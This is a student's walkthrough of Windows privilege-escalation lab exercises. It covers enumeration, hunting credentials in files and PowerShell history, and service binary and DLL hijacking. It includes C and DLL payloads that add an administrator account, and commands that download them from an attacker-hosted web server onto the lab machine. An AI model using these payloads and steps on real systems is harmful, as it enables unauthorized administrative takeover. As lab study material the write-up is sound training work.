
# Enumeration

2. Enumerate the installed applications on _CLIENTWK220_ (VM #1) and find the flag.
```powershell
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Out-String -Stream | Select-String "OS{"
	(default)    : OS{a2ce6f46bdf413532877dd29bd3ee1c3}
```

> Answer:  OS{a2ce6f46bdf413532877dd29bd3ee1c3}



3. We'll now use an additional machine, _CLIENTWK221_ (VM #2), to practice what we learned in this section.
   Access the machine via RDP as user _mac_ with the password _IAmTheGOATSysAdmin!_.
   Identify another member of the local _Administrators_ group apart from _offsec_ and _Administrator_.
```powershell
PS C:\Users\mac> Get-LocalGroupMember "Administrators"
	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK221\Administrator Local
	User        CLIENTWK221\offsec        Local
	User        CLIENTWK221\roy           Local
```

> Answer:  roy


4. Enumerate the currently running processes on _CLIENTWK221_ (VM #2). Find a non-standard process and locate the flag in the directory of the corresponding binary file.
```powershell
# Enumerate running processes
PS C:\Users\mac> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     ...
     83       8    11884       1740       1.27   3240   0 NonStandardProcess

# Discover folder
PS C:\Users\mac> Get-ChildItem -Path C:\ -Filter NonStandardProcess.exe -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\Users\mac\AppData\Roaming\SuperCompany
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        11/15/2022   8:32 AM        1323008 NonStandardProcess.exe

# Alternate way to discover process path using PID
PS C:\Users\mac> Get-Process -Id 3240 -FileVersionInfo | Select FileName
	FileName
	--------
	C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe

# Read content
PS C:\Users\mac> Get-Content C:\Users\mac\AppData\Roaming\SuperCompany\flag.txt
	OS{5c03d15a89be52c44baa8821a0648d0e}
```

> Answer:  OS{5c03d15a89be52c44baa8821a0648d0e}

# Post-it Notes

2. Log into the system _CLIENTWK220_ (VM #1) via RDP as user _steve_. Search the file system to find login credentials for a web page for the user _steve_ and enter the password as answer to this exercise.
```powershell
# Enumerate user's directories
PS C:\Users\steve> get-childitem -path . -file -recurse -erroraction silentlycontinue
	...
	    Directory: C:\Users\steve\Contacts
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         12/6/2022   2:12 AM            168 logins.txt

# Read file
PS C:\Users\steve> Get-Content C:\Users\steve\Contacts\logins.txt

	https://myjobsucks.fr33lancers.com
	user: steve
	pass: thisIsWhatYouAreLookingFor
```

> Answer:  thisIsWhatYouAreLookingFor



3. Connect to _CLIENTWK221_ (VM #2) via RDP as user _mac_ with the password _IAmTheGOATSysAdmin!_ and locate sensitive information on the system to elevate your privileges. Once found, use the credentials to access the system as this user and find the flag on the Desktop.

```powershell
# After RDP'ing in
# Enumerate users
PS C:\Users\mac> Get-LocalUser
	Name               Enabled Description
	----               ------- -----------
	Administrator      False   Built-in account for administering the computer/domain
	damian             True
	DefaultAccount     False   A user account managed by the system.
	Guest              False   Built-in account for guest access to the computer/domain
	mac                True
	milena             True
	moss               True
	offsec             True
	richmond           True
	roy                True
	WDAGUtilityAccount False

# Enumerate groups
PS C:\Users\mac> Get-LocalGroup
	Name                                Description
	----                                -----------
	Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
	Administrators                      Administrators have complete and unrestricted access to the computer/domain
	Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
	Cryptographic Operators             Members are authorized to perform cryptographic operations.
	Device Owners                       Members of this group can change system-wide settings.
	Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
	Event Log Readers                   Members of this group can read event logs from local machine
	Guests                              Guests have the same access as members of the Users group by default, except for...
	Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
	IIS_IUSRS                           Built-in group used by Internet Information Services.
	Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
	Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
	Performance Monitor Users           Members of this group can access performance counter data locally and remotely
	Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
	Remote Desktop Users                Members in this group are granted the right to logon remotely
	Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
	Replicator                          Supports file replication in a domain
	System Managed Accounts Group       Members of this group are managed by the system.
	Users                               Users are prevented from making accidental or intentional system-wide changes an...

# Enumerate RDP group
PS C:\Users\mac> Get-LocalGroupMember "Remote Desktop Users"
	ObjectClass Name                 PrincipalSource
	----------- ----                 ---------------
	User        CLIENTWK221\damian   Local
	User        CLIENTWK221\mac      Local
	User        CLIENTWK221\milena   Local
	User        CLIENTWK221\moss     Local
	User        CLIENTWK221\richmond Local

# Enumerate Administrators
PS C:\Users\mac> Get-LocalGroupMember Administrators
	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK221\Administrator Local
	User        CLIENTWK221\offsec        Local
	User        CLIENTWK221\roy           Local

# Other groups yielded no results - spot checked

# System Info
PS C:\Users\mac> systeminfo
	Host Name:                 CLIENTWK221
	OS Name:                   Microsoft Windows 11 Pro
	OS Version:                10.0.22000 N/A Build 22000
	...
	System Type:               x64-based PC

# Network Info
PS C:\Users\mac> ipconfig /all
	Windows IP Configuration
	   Host Name . . . . . . . . . . . . : CLIENTWK221
	   ...
	Ethernet adapter Ethernet0:
		...
	   Physical Address. . . . . . . . . : 00-50-56-BF-B9-3B
	   DHCP Enabled. . . . . . . . . . . : No
	   Autoconfiguration Enabled . . . . : Yes
	   IPv4 Address. . . . . . . . . . . : 192.168.226.221(Preferred)
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 192.168.226.254
	   DNS Servers . . . . . . . . . . . : 192.168.226.254
	   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\Users\mac> netstat -ano
	Active Connections
	  Proto  Local Address          Foreign Address        State           PID
	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       948
	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       700
	  ...
	  TCP    192.168.226.221:139    0.0.0.0:0              LISTENING       4
	  TCP    192.168.226.221:3389   192.168.45.156:36850   ESTABLISHED     700
	  TCP    192.168.226.221:63712  20.44.10.122:443       ESTABLISHED     8684

PS C:\Users\mac> route print
	...
	IPv4 Route Table
	===========================================================================
	Active Routes:
	Network Destination        Netmask          Gateway       Interface  Metric
	          0.0.0.0          0.0.0.0  192.168.226.254  192.168.226.221     16
	        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
	...

# Installed Apps
PS C:\Users\mac> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	-----------
	Microsoft Edge
	Microsoft Edge Update
	Microsoft Edge WebView2 Runtime
	
	Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
	Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
	Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
	Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913

PS C:\Users\mac> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	-----------
	VMware Tools
	Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
	Microsoft Update Health Tools
	Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913

# Running Processes
PS C:\Users\mac> Get-Process
	Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
	-------  ------    -----      -----     ------     --  -- -----------
		...
	     83       8    11884       1628       2.61   3240   0 NonStandardProcess

# Find NonStandardProcess
PS C:\Users\mac> Get-Process -Id 3240 -FileVersionInfo | Select FileName
	FileName
	--------
	C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe


# Find files
PS C:\Users\mac> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xls,*ini -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\Public\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2022   8:56 AM            376 install.ini


PS C:\Users\mac> gc C:\Users\Public\Documents\install.ini
# They don't know anything about computers!!

ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA==
```

```bash
# Decode
echo ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA== | base64 -d
	{
	  "boolean": true,
	  "admin": false,
	  "user": {
	    "name": "richmond",
	    "pass": "GothicLifeStyle1337!"
	  }
	}
```

- RDP in as `richmod` (he's not part of Admin group, but is part of RDP group)
- Read `flag.txt` on Desktop

> Answer:  OS{d730ea9f35b48e20f45081002116d63f}


# PowerShell History

2. Connect to _CLIENTWK220_ (VM #1) as _daveadmin_ via RDP. Use the _Event Viewer_ to search for events recorded by Script Block Logging.
   Find the password in these events.

```bash
/cert-ignore /compression /auto-reconnect /u:daveadmin /p:"qwertqwertqwert123\!\!" /v:192.168.172.220
```

- Open Event Viewer
- Browse to **Applications and Services Logs > Microsoft > Windows > PowerShell > Operational**
![](16.1.4.2ex_eventviewer.png)

> Answer:  ThereIsNoSecretCowLevel1337



3. Connect to _CLIENTWK221_ (VM #2) via RDP as user _mac_ with the password _IAmTheGOATSysAdmin!_
   Enumerate the machine and use the methods from this section to find credentials. Utilize them and find the flag.

```powershell
PS C:\Users\mac> get-localuser
	Name               Enabled Description
	----               ------- -----------
	Administrator      False   Built-in account for administering the computer/domain
	damian             True
	DefaultAccount     False   A user account managed by the system.
	Guest              False   Built-in account for guest access to the computer/domain
	mac                True
	milena             True
	moss               True
	offsec             True
	richmond           True
	roy                True


PS C:\Users\mac> get-localgroupmember Administrators
	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK221\Administrator Local
	User        CLIENTWK221\offsec        Local
	User        CLIENTWK221\roy           Local


PS C:\Users\mac> get-localgroupmember "Remote Desktop Users"
	ObjectClass Name                 PrincipalSource
	----------- ----                 ---------------
	User        CLIENTWK221\damian   Local
	User        CLIENTWK221\mac      Local
	User        CLIENTWK221\milena   Local
	User        CLIENTWK221\moss     Local
	User        CLIENTWK221\richmond Local


PS C:\Users\mac> get-childitem -path C:\users\ -Include *.txt,*.ini,*.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue
	    Directory: C:\users\Public\Documents
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        11/15/2022   8:56 AM            376 install.ini


PS C:\Users\mac> type C:\users\public\documents\install.ini
	# They don't know anything about computers!!
		ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA==
```

```bash
echo "ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA==" | base64 -d
	{
	  "boolean": true,
	  "admin": false,
	  "user": {
	    "name": "richmond",
	    "pass": "GothicLifeStyle1337!"
	  }
	}
```

```powershell
PS C:\Users\mac> (Get-PSReadlineOption).HistorySavePath
	C:\Users\mac\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\mac> type C:\users\mac\appdata\roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	OS{9575d125b006abda12c9bf8f8cb421d8}
	...
```

> Answer:  OS{9575d125b006abda12c9bf8f8cb421d8}


# Service Binary Hijacking

2. Connect to _CLIENTWK221_ (VM #2) via RDP as user _milena_ with the password _MyBirthDayIsInJuly1!_
   Find a service in which _milena_ can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.

```powershell
# Enumerate services
PS C:\Users\milena> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}

	Name             State   PathName
	----             -----   --------
	BackupMonitor    Running C:\BackupMonitor\BackupMonitor.exe
	LSM              Running
	TrustedInstaller Running C:\Windows\servicing\TrustedInstaller.exe
	VGAuthService    Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools          Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

# Check privileges of BackupMonitor and TrustedInstaller
PS C:\Users\milena> icacls "C:\BackupMonitor\BackupMonitor.exe"
	C:\BackupMonitor\BackupMonitor.exe BUILTIN\Administrators:(I)(F)
				   NT AUTHORITY\SYSTEM:(I)(F)
				   BUILTIN\Users:(I)(RX)
				   NT AUTHORITY\Authenticated Users:(I)(M)                    #<--NOTE 'Modify' permission

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\milena> icacls "C:\Windows\servicing\TrustedInstaller.exe"
	C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
				  BUILTIN\Administrators:(RX)
				  NT AUTHORITY\SYSTEM:(RX)
				  BUILTIN\Users:(RX)
				  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
				  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)

# Check melina's groups
PS C:\Users\milena> whoami /groups

	GROUP INFORMATION
	-----------------
	
	Group Name                             Type             SID          Attributes
	====================================== ================ ============ ==================================================
	Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
	BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
	BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
	LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
	Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```
	- As the user is a member of the Authenticated Users group AND BackupMonitor allows that group to Modify the file, we've found our service

- Use `adduser` as a replacement and to add an admin
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
  
  return 0;
}
```
```bash
# Cross-compile and host
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python3 -m http.server 80
```

- Replace service's binary, reboot to trigger, get interactive shell of new user, run PS as 'admin', and read flag
```powershell
PS C:\Users\milena> iwr -uri http://192.168.45.242/adduser.exe -Outfile adduser.exe
PS C:\Users\milena> move C:\BackupMonitor\BackupMonitor.exe .
PS C:\Users\milena> move adduser.exe C:\BackupMonitor\BackupMonitor.exe

# Check service's start mode
PS C:\Users\milena> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BackupMonitor'}
	Name          StartMode
	----          ---------
	BackupMonitor Auto

# Check user's reboot privileges
PS C:\Users\milena> whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                          State
	============================= ==================================== ========
	SeShutdownPrivilege           Shut down the system                 Disabled      # <--NOTE
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled


PS C:\Users\milena> shutdown /r /t 0

# Reconnect & verify
PS C:\Users\milena> Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK221\Administrator Local
User        CLIENTWK221\dave2         Local         # <--Added User
User        CLIENTWK221\offsec        Local
User        CLIENTWK221\roy           Local

# Find user who started service
PS C:\Users\milena> Get-CimInstance -ClassName win32_service -Filter "name='BackupMonitor'" | select StartName
	StartName
	---------
	.\roy

# Switch to new user
PS C:\Users\milena> runAs /user:dave2 powershell.exe
	Enter the password for dave2:
	Attempting to start powershell.exe as user "CLIENTWK221\dave2" ...

# Start PS terminal 'run as Admin'
PS C:\Windows\system32> Start-Process powershell.exe -Verb runAs

# Get flag
PS C:\Windows\system32> type C:\users\roy\desktop\flag.txt
OS{bda3a494a3aecfa18b14dcf00e35dd79}
```

> Answer:  OS{bda3a494a3aecfa18b14dcf00e35dd79}


# DLL Hijacking

1. Follow the steps from this section on _CLIENTWK220_ (VM #1) to identify the missing DLL, cross-compile your own DLL, and place it in a directory that it gets executed when the service _BetaService_ is restarted. Obtain code execution, an interactive shell, or access to the GUI and enter the flag, which can be found on the desktop of _daveadmin_.

- Start by enumerating the services and check permissions on these files
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\windows\system32\*')}

	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

- Check permissions on the binary file
```powershell
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
	.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
		 BUILTIN\Administrators:(F)
		 CLIENTWK220\steve:(RX)
		 CLIENTWK220\offsec:(F)
```

- Start up Procmon to observe any calls to missing DLLs
	- (**procmon64.exe** is in the C:\\tools\\procmon\\ directory)
- Add filter for service
	- Add > Apply > Ok
![](procmon_filter.png)

- Restart the service to capture processes
```powershell
PS C:\Users\steve> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

> Can add filters to narrow down further:
	- Operation - Contains - Reg - then - Include
	- Result - Is - NAME NOT FOUND - then - Include

![](procmon_results.png)

- Reuse the adduser.c code within DLL load case, adding *include* statement for the header file **windows.h**
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

- Cross compile
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

- Transfer to victim computer and run
```powershell
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...

# Verify user was added and given Administrator group privs
PS C:\Users\steve\Documents> net user
	User accounts for \\CLIENTWK220
	
	-------------------------------------------------------------------------------
	Administrator            BackupAdmin              dave
	dave2                    daveadmin                DefaultAccount
...

PS C:\Users\steve\Documents> net localgroup administrators
	...
	Administrator
	BackupAdmin
	dave2
	...
```

- Once done can switch to admin user `dave2` within powershell and elevate powershell prompt to High Mandatory Level
```powershell
PS C:\Users\steve\Documents> runAs /user:dave2 powershell.exe
	Enter the password for dave2:
	Attempting to start powershell.exe as user "CLIENTWK220\dave2" ...

# In next powershell prompt, verify user, integrity level, and elevate
PS C:\Windows\system32> whoami
	clientwk220\dave2

PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes                  
	============================================================= ================ ============ ==================================================
	...
	Mandatory Label\Medium Mandatory Level


PS C:\Windows\system32> Start-Process powershell.exe -Verb RunAs

# In next powershell prompt, verify integrity level
PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ===============================================================
	...
	Mandatory Label\High Mandatory Level
```


# Unquoted Service Paths